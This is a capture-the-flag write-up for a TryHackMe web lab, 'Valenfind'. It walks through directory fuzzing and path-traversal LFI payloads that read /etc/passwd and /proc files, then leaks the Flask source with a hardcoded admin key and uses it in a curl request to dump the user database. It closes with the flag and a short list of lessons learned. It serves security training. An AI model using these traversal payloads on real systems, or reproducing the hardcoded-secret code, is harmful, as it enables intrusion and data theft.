---
title: Valenfind
difficulty: Medium
environment: Linux & Web
tags:
  - ffuf
  - LFI
  - Python
  - Flask
  - Hardcoded Credentials
  - SQLite
  - Web
  - Linux
image: "https://cards.scryfall.io/art_crop/front/2/b/2b0eb016-8842-4ff2-a202-f32213b06e18.jpg?1641069918"
image_alt: "Heartfire art"
date: 2026-02-18
---

## Overview

Valenfind is a medium web challenge from TryHackMe's *Love at First Breach 2026* event. The premise is a Valentine's dating app that was supposedly "vibe-coded". The attack chain moves from directory enumeration to a Local File Inclusion vulnerability, which leaks the application source. Inside the source sits a hardcoded API key that grants access to a hidden admin endpoint, allowing full database exfiltration and the flag. Cool box.

## Reconnaissance

### Directory Enumeration

The application runs on port 5000. Starting with `ffuf` using `common.txt`:

```bash
ffuf -u http://MACHINE_IP:5000/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Standard endpoints showed up: `/login`, `/register`, `/dashboard`. After registering an account and logging in, the dashboard exposes user profiles with visible usernames. Navigating directly to `/profile/admin` confirmed that a privileged admin account exists.

## Exploitation

### Poking at the Attack Surface

After mapping the app, there was quite a bit of attack surface to work through. The dashboard had profile fields, search functionality, and various user-facing inputs. Before stumbling into file inclusion I spent time methodically testing for reflected and stored XSS across profile fields and query parameters, SQL injection on the login and search forms, and IDOR on profile endpoints. None of those panned out. The breakthrough came from a different angle entirely when i noticed something wierd in burp while changing themes.

### Local File Inclusion

Inspecting the dashboard source revealed a JavaScript function that loads layout themes dynamically:

```javascript
fetch(`/api/fetch_layout?layout=${layoutName}`)
```

Classic file inclusion territory. No filtering at all. Basic directory traversal worked on the first try (well, almost first, since i had small troubles finding out where I was located in the filesystem):

```
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../etc/passwd
```

The server dumped `/etc/passwd`. LFI confirmed.

### Enumerating the Process Environment

Before going after source code, I checked `/proc/self/environ` to see if the app had any secrets exposed as environment variables. Things like `SECRET_KEY`, `ADMIN_PASSWORD`, `DB_PASSWORD`, `FLAG`, `JWT_SECRET`, or `FLASK_ENV` can sometimes be sitting right there.

```
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/environ
```

No luck. The environment was clean, just standard system variables. One interesting detail though: `HOME=/root`, meaning the Flask app is running as root. The fact that the environment was void of anything sensitive suggested that secrets are hardcoded in the source code or a config file rather than being passed in properly.

### Finding the Application Path

Next I pulled `/proc/self/cmdline` to get the exact command line of the running process:

```
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/cmdline
```

This returned the path: `/opt/Valenfind/app.py`.

### Source Code Recovery

With the path in hand, I grabbed the full source:

```
http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
```

The server returned the entire `app.py`. Key parts of the leaked source:

```python
import os
import sqlite3
import hashlib
from flask import (Flask, render_template, request, redirect,
                   url_for, session, send_file, g, flash, jsonify)
from seeder import INITIAL_USERS

app = Flask(__name__)
app.secret_key = os.urandom(24)
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

Yay! Hardcoded admin API key, right at the top. The source also revealed a hidden endpoint that uses this key to export the database:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        try:
            return send_file(DATABASE, as_attachment=True,
                             download_name='valenfind_leak.db')
        except Exception as e:
            return str(e)
    else:
        return jsonify({
            "error": "Forbidden",
            "message": "Missing or Invalid Admin Token"
        }), 403
```

The only thing protecting the database dump is a string comparison against the hardcoded key.

### Database Exfiltration

At this point it was just a matter of sending the right header:

```bash
curl -X GET "http://MACHINE_IP:5000/api/admin/export_db" \
  -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  --output valenfind.db
```

The server handed over the full SQLite database. Querying it locally:

```bash
sqlite3 valenfind.db "SELECT * FROM users;"
```

The `cupid` user entry contained the flag in the address field.

## Flags

- **Flag:** `v1be_c0ding_1s_not_my_cup_0f_t3a`

Vibe coding can be fun, but maybe launching a public app with an insecure backend isn’t the ideal stress test in real life.

## Lessons Learned

- Containerization would’ve saved the day.
Or, at the very least, don’t launch it with `sudo python3 app.py` -> the Flask process inherits root privileges.Create a low-privileged user (e.g., www-data, flask, or appuser) and run the application with least privilege.
- Hardcoded secrets in source code are one `cat` away from compromise once any file-read vulnerability exists. API keys and credentials belong in environment variables (or PW managers) stored properly.
- Hidden endpoints are not secure endpoints. If the only thing protecting an admin route is that nobody knows the URL, any source leak (or brute-force) exposes it immediately.
- The "vibe coding" premise here is a good reminder: AI-generated code still needs human review, especially around authentication, authorization, and input handling. Insecure patterns are common in the training data (public code), so they are statistically reinforced and reproduced by models (atleast without explicit security constraints).
